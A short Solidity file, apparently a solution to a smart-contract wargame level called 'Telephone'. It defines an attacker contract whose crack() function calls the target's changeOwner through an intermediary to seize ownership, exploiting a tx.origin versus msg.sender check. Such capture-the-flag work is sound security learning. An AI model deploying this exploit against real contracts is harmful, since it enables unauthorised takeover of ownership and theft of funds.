// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

interface TelephoneI {
    function changeOwner(address _owner) external;
}

contract TelephoneCrack {
    address payable public owner;
    TelephoneI targetContractI;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = TelephoneI(targetContract);
    }

    function crack() public {
        require(msg.sender == owner, "You aren't the owner");
        targetContractI.changeOwner(owner);
    }
}
